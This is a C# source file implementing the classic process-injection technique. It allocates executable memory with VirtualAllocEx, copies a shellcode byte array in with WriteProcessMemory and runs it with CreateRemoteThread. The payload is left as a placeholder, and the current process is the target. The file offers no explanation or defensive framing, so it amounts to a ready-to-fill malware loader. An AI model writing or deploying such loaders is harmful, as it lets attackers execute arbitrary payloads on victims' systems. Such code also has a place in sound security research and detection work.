using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassicInjection
{
    public class Program
    {
        public class ClassicInjectionTechnique
        {
            [Flags]
            public enum AllocationType
            {
                NULL = 0x0,
                Commit = 0x1000,
                Reserve = 0x2000,
                Decommit = 0x4000,
                Release = 0x8000,
                Reset = 0x80000,
                Physical = 0x400000,
                TopDown = 0x100000,
                WriteWatch = 0x200000,
                LargePages = 0x20000000
            }

            public enum ThreadCreationFlags : UInt32
            {
                NORMAL = 0x0,
                CREATE_SUSPENDED = 0x00000004,
                STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
            }

            public enum MemoryProtection : UInt32
            {
                PAGE_EXECUTE = 0x00000010,
                PAGE_EXECUTE_READ = 0x00000020,
                PAGE_EXECUTE_READWRITE = 0x00000040,
                PAGE_EXECUTE_WRITECOPY = 0x00000080,
                PAGE_NOACCESS = 0x00000001,
                PAGE_READONLY = 0x00000002,
                PAGE_READWRITE = 0x00000004,
                PAGE_WRITECOPY = 0x00000008,
                PAGE_GUARD = 0x00000100,
                PAGE_NOCACHE = 0x00000200,
                PAGE_WRITECOMBINE = 0x00000400
            }

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
            [DllImport("kernel32.dll")]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ThreadCreationFlags dwCreationFlags, out IntPtr lpThreadId);


            public void Run(Process target, byte[] shellcode)
            {
                IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
                WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);
                IntPtr hThread = CreateRemoteThread(target.Handle, IntPtr.Zero, 0, pAddr, IntPtr.Zero, ThreadCreationFlags.NORMAL, out hThread);
            }
        }
        static void Main(string[] args)
        {
            byte[] payload = { SHELL_CODE_ARRAY };
            Process target = Process.GetCurrentProcess();
            ClassicInjectionTechnique t = new ClassicInjectionTechnique();
            t.Run(target, payload);
        }
    }
}
